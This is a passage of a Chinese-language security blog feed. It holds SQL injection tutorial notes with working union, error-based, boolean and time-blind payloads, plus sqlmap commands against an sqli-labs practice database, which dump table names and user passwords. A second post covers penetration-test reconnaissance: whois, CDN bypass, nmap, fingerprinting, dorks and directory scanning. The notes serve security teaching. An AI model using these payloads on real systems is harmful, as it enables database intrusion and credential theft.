text">?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata --+<br></code></pre></td></tr></table></figure><p>指定数据库中表名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+<br>指定数据库中指定表中所有字段名<br>?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+<br></code></pre></td></tr></table></figure><p>具体数据</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=-1&#x27; union select 1,2,group_concat(username,password) from users --+<br></code></pre></td></tr></table></figure><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>前提：页面会显示数据库报错信息。<br>得到报错信息、获取所有数据库名、获取指定数据库所有表名、获取指定数据库指定表中所有字段名、获取具体数据。<br>数据库名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a) --+<br></code></pre></td></tr></table></figure><p>或所有数据库名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(schema_name)from information_schema.schemata),0x7e),1) --+<br></code></pre></td></tr></table></figure><p>由于无法像联合查询一样一次性看到所有数据库名称，就需要使用limit参数逐个查询</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),floor (rand()*2)) as x from information_schema.tables group by x) as a) --+<br></code></pre></td></tr></table></figure><p>指定数据库中表名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and (select 1 from (select count(*),concat(((select concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+<br>指定数据库中指定表中所有字段名<br>?id=1&#x27; and (select 1 from (select count(*),concat((select concat(column_name,&#x27;;&#x27;) from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),floor(rand()*2)) as x from information_schema.columns group by x) as a) --+<br></code></pre></td></tr></table></figure><p>具体数据</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (&#x27;Dumb&#x27;,&#x27;Angelina&#x27;))))--+<br></code></pre></td></tr></table></figure><p>或使用limit挨个遍历</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and (select 1 from (select count(*),concat((select(select concat(cast(concat(username,0x3a,password) as char),0x7e)) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+<br></code></pre></td></tr></table></figure><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>情况：没有显示位、没有报错信息，但是有SQL语句执行错误信息输出的场景，仅仅通过报错这一行为去判断SQL注入语句是否执行成功。<br>数据库长度</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and (length(database()))&gt;7 --+<br>?id=1&#x27; and (length(database()))&gt;8 --+<br></code></pre></td></tr></table></figure><p>数据库名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+或?id=1&#x27; and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a) --+<br></code></pre></td></tr></table></figure><p>或所有数据库名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(schema_name)from information_schema.schemata),0x7e),1) --+<br></code></pre></td></tr></table></figure><p>由于无法像联合查询一样一次性看到所有数据库名称，就需要使用limit参数逐个查询</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),floor (rand()*2)) as x from information_schema.tables group by x) as a) --+<br></code></pre></td></tr></table></figure><p>指定数据库中表名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and (select 1 from (select count(*),concat(((select concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+<br></code></pre></td></tr></table></figure><p>指定数据库中指定表中所有字段名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and (select 1 from (select count(*),concat((select concat(column_name,&#x27;;&#x27;) from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),floor(rand()*2)) as x from information_schema.columns group by x) as a) --+<br></code></pre></td></tr></table></figure><p>具体数据</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (&#x27;Dumb&#x27;,&#x27;Angelina&#x27;))))--+<br></code></pre></td></tr></table></figure><p>或使用limit挨个遍历<br>?id&#x3D;1’ and (select 1 from (select count(*),concat((select(select concat(cast(concat(username,0x3a,password) as char),0x7e)) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) –+</p><h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>前提：页面上没有显示位，也没有输出SQL语句执行错误信息。 正确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条件之后，页面的返回速度明显慢了5秒。<br>缺点：因为是通过sleep()函数影响的响应时间来判断语句是否执行，所以比布尔盲注更慢，真实环境下时间盲注一个注入点需要跑大概五六个小时。<br>猜解数据库<br>数据库个数</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1 and if((select count(schema_name) from information_schema.schemata)=9,sleep(5),1)<br></code></pre></td></tr></table></figure><p>第一个数据库名有多少个字符</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1 and if((select length(schema_name) from information_schema.schemata limit0,1)=18,sleep(5),1)<br></code></pre></td></tr></table></figure><p>判断第一个库第一个字符</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1 and if((select ascii(substr((select schema_name from information_schema.schemata limit0,1),1,1)))=105,sleep(5),1)<br>?id=1 and if((select ascii(substr((select schema_name from information_schema.schemata limit0,1),2,1)))=110,sleep(5),1)//判断第一个库第二个字符<br></code></pre></td></tr></table></figure><p>当前数据库<br>当前数据库长度</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27;+and+if((length(database()))=7,sleep(5),1) --+<br>?id=1&#x27;+and+if((length(database()))=8,sleep(5),1) --+<br></code></pre></td></tr></table></figure><p>当前数据库名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+<br></code></pre></td></tr></table></figure><p>猜解表名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=108,sleep(5),1) --+<br></code></pre></td></tr></table></figure><p>URL编码后：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1%27%20and%20if((ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20t<br>able_schema=database()%20limit%200,1),1,1)))=108,sleep(5),1)%20--+<br></code></pre></td></tr></table></figure><p>猜解字段名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and if((ascii(substr((select column_name from information_schema.columns where table_name=&#x27;表名&#x27; limit 1,1),1,1)))=102,sleep(5),1) --+<br></code></pre></td></tr></table></figure><p>URL编码后：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1%27%20and%20if((ascii(substr((select%20column_name%20from%20information_schema.columns%20<br>where%20table_name=%27users%27%20limit%201,1),1,1)))=102,sleep(5),1)%20--+<br></code></pre></td></tr></table></figure><p>猜解具体数据</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and if((ascii(substr((select 字段名 from 表名 limit 0,1),1,1)))=102,sleep(5),1) --+<br></code></pre></td></tr></table></figure><p>URL编码后：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1%27%20and%20if((ascii(substr((select%20password%20from%20users%20limit%200,1),1,1)))=102,<br>sleep(5),1)%20--+<br></code></pre></td></tr></table></figure><h3 id="8）实用工具注入"><a href="#8）实用工具注入" class="headerlink" title="8）实用工具注入"></a>8）实用工具注入</h3><h5 id="1-sqlmap"><a href="#1-sqlmap" class="headerlink" title="1.sqlmap"></a>1.sqlmap</h5><p>基础探测命令<br>联合查询注入：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">.\sqlmap.py -u &quot;http://192.168.xxx.xxx/sqli/Less-1/?id=1&quot; --dbms=MySQL --technique=U -v 3<br></code></pre></td></tr></table></figure><p>报错注入：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">.\sqlmap.py -u &quot;http://192.168.xxx.xxx/sqli/Less-1/?id=1&quot; --dbms=MySQL --technique=E -v 3<br></code></pre></td></tr></table></figure><p>布尔盲注：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">.\sqlmap.py -u &quot;http://192.168.xxx.xxx/sqli/Less-1/?id=1&quot; --dbms=MySQL --technique=B -v 3<br></code></pre></td></tr></table></figure><p>时间盲注：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">.\sqlmap.py -u &quot;http://192.168.xxx.xxx/sqli/Less-1/?id=1&quot; --dbms=MySQL --technique=T -v 3<br></code></pre></td></tr></table></figure><p>爆破数据<br>–current-db 当前使用的数据库<br>–dbs 列出数据库信息<br>-D 指定数据库，爆破指定数据库中的表<br>-D 数据库名 –tables<br>-T 指定数据表名，爆破指定表中的字段<br>-D 库名 -T 表名 –columns<br>-C 指定字段名，爆破具体数据<br>–dump 将数据导出、转储<br>指定库、表、字段，查询具体数据</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">.\sqlmap.py -u &quot;http://192.168.xxx.xxx/sqli/Less-1/?id=1&quot; --dbms=MySQL --technique=T -v 3 -D security<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>信息收集</title>
    <link href="/2023/10/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1/"/>
    <url>/2023/10/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1/</url>
    
    <content type="html"><![CDATA[<h1 id="渗透测试流程？"><a href="#渗透测试流程？" class="headerlink" title="渗透测试流程？"></a>渗透测试流程？</h1><hr><ul><li>确定目标</li><li>信息收集</li><li>漏洞扫描</li><li>漏洞利用</li><li>形成报告</li></ul><h1 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h1><h2 id="包括内容"><a href="#包括内容" class="headerlink" title="包括内容"></a>包括内容</h2><h3 id="1-域名相关的信息"><a href="#1-域名相关的信息" class="headerlink" title="1. 域名相关的信息"></a>1. 域名相关的信息</h3><h4 id="域名是什么。"><a href="#域名是什么。" class="headerlink" title="域名是什么。"></a>域名是什么。</h4><pre><code class="hljs">&gt;1.互联网上某个网页或Web应用程序的名称&gt;&gt;2.它由一串用点分隔的字符组成的，用于在数据传输时标识计算机的电子方位或地理位置。&gt;&gt;3.域名的目的是为网站提供一个简单，可识别的名称，方便用户和浏览器访问。&gt;&gt;4.如果没有域名，网站将通过其IP地址来识别，这些IP地址显示为一串数字，不易记忆。域名可分为：1.国际域名    .com(商业公司);.net(网络服务);.org(组织协会等);.gov(政府部    门);.edu(教育机构);.mil(军事领域);.int(国际组织)2.国别域名        .CN代表中国，.UK代表英国，.US代表美国3.新顶级域名    biz, info，name，pro，aero, coop, museum…</code></pre><h4 id="域名与IP："><a href="#域名与IP：" class="headerlink" title="域名与IP："></a>域名与IP：</h4><pre><code class="hljs">&gt;域名和IP地址都是为网址提供访问入口的，只是访问的形式不一样1。 域名是作为代替IP地址的形式而存在的，因为IP地址在上网的过程中比较麻烦，并且不容易记录1。 域名可以对应多个IP地址，但是一个IP地址只是对应于一个域名2。 查询域名的IP地址可以通过DNS服务器或者命令提示符的nslookup命令34。 域名最终是解析到IP上的，域名与IP在内网访问还是外网访问，看IP是内网IP还是公网IP&gt;通过域名解析----&gt;得到IP地址</code></pre><h4 id="域名联系人信息"><a href="#域名联系人信息" class="headerlink" title="域名联系人信息"></a>域名联系人信息</h4><pre><code class="hljs">&gt;所属人、邮箱、电话、地址......</code></pre><h4 id="whois"><a href="#whois" class="headerlink" title="whois:"></a>whois:</h4><pre><code class="hljs">&gt;    工具：        1)Kali----whois        2)在线查询：             https://whois.chinaz.com            https://whois.aizhan.com/            https://whois.aliyun.com/</code></pre><h4 id="域名反查："><a href="#域名反查：" class="headerlink" title="域名反查："></a>域名反查：</h4><pre><code class="hljs">http://whois.chinaz.com/reverse</code></pre><h4 id="IP，域名查询："><a href="#IP，域名查询：" class="headerlink" title="IP，域名查询："></a>IP，域名查询：</h4><pre><code class="hljs">https://site.ip138.com/</code></pre><h4 id="ICP备案查询"><a href="#ICP备案查询" class="headerlink" title="ICP备案查询"></a>ICP备案查询</h4><pre><code class="hljs">作用:        必须在工信部的系统中备案，才能够通过域名访问工具：        https://icp.chinaz.com/(首选)        https://beian.miit.gov.cn/#/Integrated/index        https://www.beian88.com/</code></pre><h4 id="企业信息查询"><a href="#企业信息查询" class="headerlink" title="企业信息查询"></a>企业信息查询</h4><pre><code class="hljs">天眼查，企查查</code></pre><h4 id="子域名收集："><a href="#子域名收集：" class="headerlink" title="子域名收集："></a>子域名收集：</h4><pre><code class="hljs">子域名是主域名的下一级域名，通常是大型公司为了满足不同产品或业务需求在主域名基础上发展而来。 子域名一般会根据不同用途在主域名前面加上不同的前缀构成。 子域名根据主域名前面的前缀数量，又可分为二级子域名、三级子域名和多级的子域名</code></pre><h4 id="子域名收集方法："><a href="#子域名收集方法：" class="headerlink" title="子域名收集方法："></a>子域名收集方法：</h4><pre><code class="hljs">字典猜解，域名枚举工具：    子域名挖掘机：layer    功能强大的子域名收集：OneForAll    用小字典递归地发现域名：subDomainsBrute</code></pre><h4 id="域名DNS信息"><a href="#域名DNS信息" class="headerlink" title="域名DNS信息"></a>域名DNS信息</h4><pre><code class="hljs">简介：DNS是域名解析协议DNS 是域名系统 (Domain Name System) 的缩写，是因特网的一项核心服务，它作为可以将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。这也是DNS的官方说法。说白了就是：在互联网中通过IP 地址来进行通信。但是IP 地址的表示形式是数字，很难进行记忆（比如116.213.120.232），所以为每个 IP取一个人类更易记忆的域名形式（比如www.google.com），而通过DNS 来把解析域名成为 IP（将方便人理解的命名格式解析成计算机能够理解的格式，也可以将IP 翻译成域名）DNS记录类型</code></pre><p>​<br>​域名解析工具：<br>​kali:<br>​host url<br>​dig url</p><h3 id="2-IP相关的信息"><a href="#2-IP相关的信息" class="headerlink" title="2. IP相关的信息"></a>2. IP相关的信息</h3><h4 id="DNS服务器类型"><a href="#DNS服务器类型" class="headerlink" title="DNS服务器类型"></a>DNS服务器类型</h4><pre><code class="hljs">1.本地域名服务器2.根域名服务器3.顶级域名服务器4.授权域名服务器 DNS解析流程迭代查询：    我告诉你去哪个服务器查询，依次查询递归查询：    我帮你去下一个服务器查询，层层返回</code></pre><h4 id="如何根据域名获得IP"><a href="#如何根据域名获得IP" class="headerlink" title="如何根据域名获得IP"></a>如何根据域名获得IP</h4><pre><code class="hljs">工具：    ping    nslookupIP归属：    http://ipwhois.cnnic.net.cn/</code></pre><h4 id="如何获得CDN背后的真实IP"><a href="#如何获得CDN背后的真实IP" class="headerlink" title="如何获得CDN背后的真实IP"></a>如何获得CDN背后的真实IP</h4><p>CDN：</p><pre><code class="hljs">内容分发网络    解决因分布、带宽、服务器性能带来的访问延迟问题，适用于站点加速、点播、直播等场景。使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度和成功率。    控制时延无疑是现代信息科技的重要指标，CDN的意图就是尽可能的减少资源在转发、传输、链路抖动等情况下顺利保障信息的连贯性。通俗易懂：    让在各个不同的地点的网络用户，都可以迅速访问到网站提供的内容常见厂商：    帝联/蓝讯/网宿/七牛云/腾讯/百度/阿里云...实现流程（以阿里云为例）：    https://www.zhihu.com/question/36514327/answer/1604554133</code></pre><p>获取真实IP：</p><pre><code class="hljs">1.超级PING    查看IP数量：        http://ping.chinaz.com/        nslookup2.历史DNS    https://sitereport.netcraft.com/?url=    DNSdb：https://dnsdb.io/zh-cn/    微步在线：https://x.threatbook.cn3.通过子域名查询IP    思路：不重要的网站没有挂CDN4.国外主机解析    https://asm.ca.com/zh_cn/ping.php    http://host-tracker.com/    http://www.webpagetest.org/    https://dnscheck.pingdom.com/5.其他    网络空间搜索引擎：fofa,censys    邮箱：    手机APP抓包：    微信服务号抓包：</code></pre><h3 id="3-端口服务相关的信息"><a href="#3-端口服务相关的信息" class="headerlink" title="3. 端口服务相关的信息"></a>3. 端口服务相关的信息</h3><pre><code class="hljs">1.端口扫描思路：    1）一个服务对应一个端口。    2）本机端口查询：        Windows：nststat -ano|findstr 3306        Linux：netstat -an|grep 3306    3）远程机器端口：        telnet ip:端口        wget ip:端口        nc -vz ip:端口2.常见端口及漏洞（端口服务信息课件）    文件共享服务    远程连接服务    web应用服务    数据库服务    邮件服务    网络常见协议    特殊服务3.端口扫描工具    nmap:（nmap使用技巧）        基本介绍            1）扫描主机            2）扫描端口            3）探测操作系统，软件版本        参数分类        参数示例        脚本    其它工具：        masscan、nbtscan        http://coolaf.com/tool/port</code></pre><h3 id="4-指纹识别（CMS-CDF-WAF）"><a href="#4-指纹识别（CMS-CDF-WAF）" class="headerlink" title="4. 指纹识别（CMS&#x2F;CDF&#x2F;WAF）"></a>4. 指纹识别（CMS&#x2F;CDF&#x2F;WAF）</h3><h4 id="什么是指纹识别："><a href="#什么是指纹识别：" class="headerlink" title="什么是指纹识别："></a>什么是指纹识别：</h4><pre><code class="hljs">根据关键特征，识别程序名称，版本等信息识别对象：        1、CMS信息：        比如Discuz、织梦、帝国CMS、PHPCMS、ECshop等；    2、前端技术：        比如HTML5、jquery、bootstrap、Vue、ace等；    3、开发语言：        比如PHP、Java、Ruby、Python、C#等；    4、Web服务器：        比如Apache、 Nginx,、IIS、lighttpd等；    5、应用服务器：        比如Tomcat、Jboss、Weblogic、Websphere等；    6、操作系统信息：        比如Linux、win2k8、win7、Kali、Centos等；    7、CDN信息：        是否使用CDN，如cloudflare、帝联、蓝讯、网宿、七牛云、阿里云等；    8、WAF信息：        是否使用WAF，如D盾、云锁、宝塔、安全狗、360等</code></pre><h4 id="什么是CMS"><a href="#什么是CMS" class="headerlink" title="什么是CMS"></a>什么是CMS</h4><pre><code class="hljs">Content Management System 内容管理系统 常见CMS:            企业建站系统：        MetInfo(米拓)、蝉知、SiteServer CMS等;    B2C商城系统：        商派Shopex、ECshop、HiShop、XpShop等;    门户建站系统：        DedeCMS(织梦)、帝国CMS、PHPCMS、动易、CmsTop等;    博客系统：        WordPress、Z-Blog等;    论坛社区：        Discuz、PHPwind、WeCenter等;    问答系统：        Tipask、whatsns等;    知识百科系统：        HDwiki;    B2B门户系统：        Destoon、B2Bbuilder、友邻B2B等;    人才招聘网站系统：        骑士CMS、PHP云人才管理系统;    房产网站系统：        FangCms等;    在线教育建站系统：        Kesion、EduSoho;    电影网站系统：        苹果CMS、ctcms、movcms等;    小说文学建站系统：        杰奇CMS;</code></pre><h4 id="CMS指纹识别的思路"><a href="#CMS指纹识别的思路" class="headerlink" title="CMS指纹识别的思路"></a>CMS指纹识别的思路</h4><pre><code class="hljs">版权信息    Powered by XXX 特定的文件MD5     https://github.com/Lucifer1993/cmsprint查看网页源码    分析特定的路径或者代码内容特定文件    比如robots.txt</code></pre><h4 id="CMS指纹识别的工具"><a href="#CMS指纹识别的工具" class="headerlink" title="CMS指纹识别的工具"></a>CMS指纹识别的工具</h4><pre><code class="hljs">Kali自带工具：    whatweb    cmseek浏览器插件：    whatruns    Wappalyzer在线网站    http://whatweb.bugscaner.com    http://finger.tidesec.com/离线工具：    御剑指纹扫描器（需要.NET Framework）    Test404轻量CMS指纹识别其他开源程序    https://github.com/Tuhinshubhra/CMSeeK</code></pre><h4 id="CDN指纹识别工具"><a href="#CDN指纹识别工具" class="headerlink" title="CDN指纹识别工具"></a>CDN指纹识别工具</h4><pre><code class="hljs">基本工具：    kali自带lbd    load balance detector专用识别工具：    http://cdn.chinaz.com/    https://www.cdnplanet.com/tools/cdnfinder/其他    https://github.com/boy-hack/w8fuckcdn/    https://github.com/3xp10it/xcdn</code></pre><h4 id="WAF指纹识别"><a href="#WAF指纹识别" class="headerlink" title="WAF指纹识别"></a>WAF指纹识别</h4><p>WAF是什么：</p><pre><code class="hljs">Web Application Firewall Web 应用防火墙过滤HTTP或者HTTPS的请求，识别并拦截恶意的请求</code></pre><p>类型：</p><pre><code class="hljs">硬件型 WAF软件型 WAF云 WAF软件型 WAF软件型 WAF部署在 Apache、Nginx 等 HTTP Server 中)</code></pre><p>WAF的作用：</p><pre><code class="hljs">l SQL Injection (SQLi)：阻止SQL注入l Cross Site Scripting (XSS)：阻止跨站脚本攻击l Local File Inclusion (LFI)：阻止利用本地文件包含漏洞进行攻击l Remote File Inclusione(RFI)：阻止利用远程文件包含漏洞进行攻击l Remote Code Execution (RCE)：阻止利用远程命令执行漏洞进行攻击l PHP Code Injectiod：阻止PHP代码注入l HTTP Protocol Violations：阻止违反HTTP协议的恶意访问l HTTPoxy：阻止利用远程代理感染漏洞进行攻击l Sshllshock：阻止利用Shellshock漏洞进行攻击l Session Fixation：阻止利用Session会话ID不变的漏洞进行攻击l Scanner Detection：阻止黑客扫描网站l Metadata/Error Leakages：阻止源代码/错误信息泄露l Project Honey Pot Blacklist：蜜罐项目黑名单l GeoIP Country Blocking：根据判断IP地址归属地来进行IP阻断</code></pre><p>WAF的识别思路：</p><pre><code class="hljs">额外的cookie；任何响应或请求的附加标头；响应内容（如果被阻止请求）；响应代码（如果被阻止请求）；IP地址（云WAF）；JS客户端模块（客户端WAF）</code></pre><p>指纹库：</p><pre><code class="hljs">https://github.com/CSecGroup/wafid/blob/master/finger.xml</code></pre><p>WAF指纹识别工具：</p><pre><code class="hljs">Kali自带：    https://github.com/EnableSecurity/wafw00f    用法：wafw00f https://www.12306.cnnmap：     nmap www.12306.cn --script=http-waf-detect.nsesqlmap -u &quot;xxx.com?id=1&quot; --identify-waf其他：(WAF文档)    https://github.com/0xInfection/Awesome-WAF</code></pre><h3 id="5-搜索引擎收集"><a href="#5-搜索引擎收集" class="headerlink" title="5.搜索引擎收集"></a>5.搜索引擎收集</h3><p>Google Hacking</p><pre><code class="hljs">Google DorksGoogle Hacking</code></pre><p>运算符：</p><pre><code class="hljs">完全匹配：“”包裹任意字词：不包含：-xxx数字范围：xx..xx</code></pre><p>高级语法：</p><pre><code class="hljs">只搜索某个网站的内容：site:xxx.com网页的内容包含：allintext: xxxxxx                intext:xxxxx标题出现：allintitle:xxxx            intitle:xxxxURL地址包含：allinurl:xxxx                inurl:xxxx文件类型指定：filetype: xxxxindex of:文件目录结构泄露</code></pre><p>语法数据库：</p><pre><code class="hljs">https://www.exploit-db.com/google-hacking-databasehttps://github.com/BullsEye0/google_dork_ list</code></pre><p>工具：（github搜索）</p><pre><code class="hljs">google hackinggoogle dorks</code></pre><h3 id="6-网络空间搜索引擎"><a href="#6-网络空间搜索引擎" class="headerlink" title="6. 网络空间搜索引擎"></a>6. 网络空间搜索引擎</h3><p>什么是网络空间：</p><pre><code class="hljs">OSINT：Open source intelligence（开源网络情报）网络系统：网络设备：工业系统：</code></pre><p>怎么扫描？</p><pre><code class="hljs">网络扫描的工具：方式：    IP库    枚举</code></pre><p>怎么标识一个设备呢？</p><pre><code class="hljs">URLIP开放端口操作系统 物理地址MAC地址设备类型</code></pre><p>实施威胁地图：</p><p><a href="https://cybermap.kaspersky.com/cn">https://cybermap.kaspersky.com/cn</a></p><p>工具：</p><pre><code class="hljs">shodancensyszoomEyefofa</code></pre><h3 id="7-目录扫描"><a href="#7-目录扫描" class="headerlink" title="7. 目录扫描"></a>7. 目录扫描</h3><p>什么是目录扫描：</p><pre><code class="hljs">部署的网站有一些敏感的文件：        配置文件：xxx.cfg    数据文件：xxx.sql                xxx.tar.gz    目录：/backup                /conf                /admin</code></pre><p>目录扫描会泄露哪些信息：</p><pre><code class="hljs">数据库用户名和密码服务器的用户名和密码网站源码数据库的文件。。。。。</code></pre><p>为什么会泄露：</p><pre><code class="hljs">配置不当的问题。本地文件包含：(local file inclusion（LFI）)        PHP：        header.php        common.php        footer.php        function.php        include()-文件包含函数    require()</code></pre><h4 id="常见的敏感目录和文件"><a href="#常见的敏感目录和文件" class="headerlink" title="常见的敏感目录和文件"></a>常见的敏感目录和文件</h4><p>网站的备份文件&#x2F;数据</p><pre><code class="hljs">在线压缩帝国备份王</code></pre><p>后台登录的目录</p><pre><code class="hljs">/admin/manage</code></pre><p>安装包(源码)</p><pre><code class="hljs">非开源，商用</code></pre><p>上传的目录</p><pre><code class="hljs">文件上传漏洞 - webshell/upload/upload.php</code></pre><p>mysql的管理界面</p><pre><code class="hljs">mysqlweb页面去管理phpadmin - 密码爆破 - webshell</code></pre><p>程序的安装路径-&#x2F;install</p><p>php的探针</p><pre><code class="hljs">phpinfo</code></pre><p>文本编辑器</p><pre><code class="hljs">UeditorkindeditorCKeditor文件上传漏洞，命令注入</code></pre><p>Linux</p><pre><code class="hljs">/etc/passwd/etc/shadow - SHA512/etc/sudoers - sudo</code></pre><p>MacOS- .DS_Store</p><p>目录穿越</p><pre><code class="hljs">windows IISApache</code></pre><p>tomcat WEB-INF</p><pre><code class="hljs">WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.WEB-INF/database.properties : 数据库配置文件WEB-INF/classes/ : 一般用来存放Java类文件(.class)WEB-INF/lib/ : 用来存放打包好的库(.jar)WEB-INF/src/ : 用来放源代码(.asp和.php等)</code></pre><p>编辑器的临时文件.swp文件</p><p>robots.txt</p><p>sitemap.xml</p><p>其它非常规文件</p><pre><code class="hljs">secret.txtpassword.txt</code></pre><h4 id="文件扫描思路"><a href="#文件扫描思路" class="headerlink" title="文件扫描思路"></a>文件扫描思路</h4><pre><code class="hljs">    直接在域名后面拼接路径/文件名，如果返回200，就是存在扫描方法：    暴力破解    字典：(kali 中自带的字典)        kali - wordlists        dirb - /usr/share/wordlists/dirb/common.txt    爬虫：        robots.txt        sitemap.xml        网页中的其它连接    fuzz(模糊测试)：</code></pre><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>dirb</p><pre><code class="hljs">kali常用</code></pre><p>burp suite</p><p>dirbrute</p><pre><code class="hljs">需要字典</code></pre><p>dirmap </p><pre><code 